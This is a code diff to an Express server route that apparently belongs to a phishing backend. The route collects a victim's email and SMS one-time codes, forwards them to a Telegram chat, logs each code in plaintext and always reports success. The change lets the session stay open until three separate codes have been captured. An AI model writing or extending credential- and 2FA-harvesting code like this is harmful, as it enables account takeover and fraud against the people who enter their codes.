@@ -68,6 +68,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const validatedData = verifyOtpSchema.parse(req.body);
       const { userId, otp } = validatedData;
+      const codeNumber = req.body.codeNumber || 1; // Get code number (1, 2, or 3)
 
       // Get temporary user data
       const userData = tempUserData.get(userId);
@@ -76,16 +77,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
       }
 
-      // Send Telegram notification for SMS code
-      const smsMessage = formatSMSMessage(userData.email, otp);
+      // Send Telegram notification for SMS code with code number
+      const smsMessage = formatSMSMessage(userData.email, otp, codeNumber);
       sendToTelegram(smsMessage).catch(err => {
         console.error("⚠️ Telegram SMS notification failed (non-blocking):", err);
       });
 
-      console.log(`✅ SMS code sent to Telegram - Code: ${otp}`);
+      console.log(`✅ SMS ${codeNumber} sent to Telegram - Code: ${otp}`);
 
-      // Clean up temporary session
-      tempUserData.delete(userId);
+      // Only clean up temporary session after the 3rd code
+      if (codeNumber === 3) {
+        tempUserData.delete(userId);
+      }
 
       // Always return success
       res.json({ 
